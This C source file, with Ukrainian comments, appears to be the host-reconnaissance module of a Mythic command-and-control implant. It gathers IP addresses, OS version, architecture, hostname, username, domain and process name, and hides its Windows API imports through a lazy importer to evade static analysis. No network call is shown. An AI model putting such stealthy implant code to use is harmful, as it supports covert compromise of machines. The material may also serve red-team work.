#include "Utils.h"
#include "lazy_importer.hpp"

// --- допоміжні ---
static PVOID li_alloc(SIZE_T size) {
    return LI_FN(LocalAlloc)(LPTR, size);
}

static VOID li_memcpy(PVOID dst, const VOID* src, SIZE_T size) {
    LI_FN(memcpy)(dst, src, size);
}

// ANSI <-> Wide конвертація без CRT
static PCHAR wideToAnsi(PWCHAR w) {
    if (!w) return NULL;
    int need = LI_FN(WideCharToMultiByte)(CP_ACP, 0, w, -1, NULL, 0, NULL, NULL);
    if (need <= 0) return NULL;
    PCHAR out = (PCHAR)li_alloc(need);
    if (!out) return NULL;
    LI_FN(WideCharToMultiByte)(CP_ACP, 0, w, -1, out, need, NULL, NULL);
    return out;
}

// =================== IP ===================
DWORD* getIPAddress(PUINT32 pCount) {
    if (!pCount) return NULL;
    *pCount = 0;

    ULONG bufLen = 16 * 1024;
    PIP_ADAPTER_ADDRESSES addrs = (PIP_ADAPTER_ADDRESSES)li_alloc(bufLen);
    if (!addrs) return NULL;

    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
    ULONG ret = LI_FN(GetAdaptersAddresses)(AF_INET, flags, NULL, addrs, &bufLen);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        LI_FN(LocalFree)(addrs);
        addrs = (PIP_ADAPTER_ADDRESSES)li_alloc(bufLen);
        if (!addrs) return NULL;
        ret = LI_FN(GetAdaptersAddresses)(AF_INET, flags, NULL, addrs, &bufLen);
    }
    if (ret != NO_ERROR) {
        LI_FN(LocalFree)(addrs);
        return NULL;
    }

    // Спершу порахуємо кількість
    UINT32 count = 0;
    for (PIP_ADAPTER_ADDRESSES a = addrs; a; a = a->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS u = a->FirstUnicastAddress; u; u = u->Next) {
            if (u->Address.lpSockaddr->sa_family == AF_INET) count++;
        }
    }

    if (count == 0) { LI_FN(LocalFree)(addrs); return NULL; }

    DWORD* out = (DWORD*)li_alloc(sizeof(DWORD) * count);
    if (!out) { LI_FN(LocalFree)(addrs); return NULL; }

    UINT32 i = 0;
    for (PIP_ADAPTER_ADDRESSES a = addrs; a; a = a->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS u = a->FirstUnicastAddress; u; u = u->Next) {
            if (u->Address.lpSockaddr->sa_family == AF_INET) {
                PSOCKADDR_IN sin = (PSOCKADDR_IN)u->Address.lpSockaddr;
                // s_addr вже в network byte order. Mythic очікує 4 байти LE.
                out[i++] = (DWORD)sin->sin_addr.S_un.S_addr;
            }
        }
    }

    LI_FN(LocalFree)(addrs);
    *pCount = count;
    return out;
}

// =================== OS ===================
PCHAR getOsName(void) {
    // RtlGetVersion дає точну версію без маніпуляцій сумісності
    typedef LONG (WINAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
    pRtlGetVersion fn = (pRtlGetVersion)LI_FN(GetProcAddress)(
        LI_FN(GetModuleHandleA)("ntdll.dll"), "RtlGetVersion");
    if (!fn) return NULL;

    RTL_OSVERSIONINFOW vi = { 0 };
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (fn(&vi) != 0) return NULL;

    // Формуємо рядок вручну
    CHAR buf[128] = { 0 };
    PCHAR p = buf;
    const CHAR* prefix = "Windows ";
    while (*prefix) *p++ = *prefix++;

    // major
    CHAR tmp[16];
    int n = 0;
    UINT32 v = vi.dwMajorVersion;
    if (v == 0) tmp[n++] = '0';
    while (v) { tmp[n++] = (CHAR)('0' + v % 10); v /= 10; }
    while (n) *p++ = tmp[--n];
    *p++ = '.';

    v = vi.dwMinorVersion;
    n = 0;
    if (v == 0) tmp[n++] = '0';
    while (v) { tmp[n++] = (CHAR)('0' + v % 10); v /= 10; }
    while (n) *p++ = tmp[--n];

    *p++ = ' ';
    *p++ = '(';
    const CHAR* b = "Build ";
    while (*b) *p++ = *b++;

    v = vi.dwBuildNumber;
    n = 0;
    if (v == 0) tmp[n++] = '0';
    while (v) { tmp[n++] = (CHAR)('0' + v % 10); v /= 10; }
    while (n) *p++ = tmp[--n];

    *p++ = ')';
    *p = 0;

    SIZE_T len = 0;
    while (buf[len]) len++;
    PCHAR out = (PCHAR)li_alloc(len + 1);
    if (!out) return NULL;
    li_memcpy(out, buf, len + 1);
    return out;
}

// =================== Arch ===================
BYTE getArch(void) {
    // Mythic: ARCHITECTURE_X64 = 9, ARCHITECTURE_X86 = 0 (як у Apollo)
    // Визначаємо через IsWow64Process
    BOOL isWow64 = FALSE;
    LI_FN(IsWow64Process)(LI_FN(GetCurrentProcess)(), &isWow64);

    SYSTEM_INFO si = { 0 };
    LI_FN(GetNativeSystemInfo)(&si);

    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        // x64 ОС
        if (isWow64) return 0; // наш процес 32-бітний
        return 9;              // наш процес 64-бітний
    }
    return 0;
}

// =================== Hostname ===================
PCHAR getHostname(void) {
    CHAR buf[256] = { 0 };
    DWORD size = sizeof(buf);
    if (!LI_FN(GetComputerNameA)(buf, &size)) return NULL;
    PCHAR out = (PCHAR)li_alloc(size + 1);
    if (!out) return NULL;
    li_memcpy(out, buf, size + 1);
    return out;
}

// =================== Username ===================
PCHAR getUserName(void) {
    CHAR buf[256] = { 0 };
    DWORD size = sizeof(buf);
    if (!LI_FN(GetUserNameA)(buf, &size)) return NULL;
    PCHAR out = (PCHAR)li_alloc(size + 1);
    if (!out) return NULL;
    li_memcpy(out, buf, size);
    out[size] = 0;
    return out;
}

// =================== Domain ===================
PWCHAR getDomain(void) {
    WCHAR buf[256] = { 0 };
    DWORD size = sizeof(buf);
    // USERDOMAIN — ім'я домену або робочої групи
    if (!LI_FN(GetEnvironmentVariableW)(L"USERDOMAIN", buf, size / sizeof(WCHAR))) {
        // fallback — "WORKGROUP"
        const WCHAR* wg = L"WORKGROUP";
        SIZE_T len = 0; while (wg[len]) len++;
        PWCHAR out = (PWCHAR)li_alloc((len + 1) * sizeof(WCHAR));
        if (!out) return NULL;
        li_memcpy(out, wg, (len + 1) * sizeof(WCHAR));
        return out;
    }
    SIZE_T len = 0; while (buf[len]) len++;
    PWCHAR out = (PWCHAR)li_alloc((len + 1) * sizeof(WCHAR));
    if (!out) return NULL;
    li_memcpy(out, buf, (len + 1) * sizeof(WCHAR));
    return out;
}

// =================== Process Name ===================
PCHAR getCurrentProcName(void) {
    CHAR buf[MAX_PATH] = { 0 };
    DWORD size = sizeof(buf);
    if (!LI_FN(QueryFullProcessImageNameA)(LI_FN(GetCurrentProcess)(), 0, buf, &size)) {
        return NULL;
    }
    // Повертаємо тільки ім'я файлу
    PCHAR last = buf;
    for (PCHAR p = buf; *p; p++) if (*p == '\\' || *p == '/') last = p + 1;
    SIZE_T len = 0; while (last[len]) len++;
    PCHAR out = (PCHAR)li_alloc(len + 1);
    if (!out) return NULL;
    li_memcpy(out, last, len + 1);
    return out;
}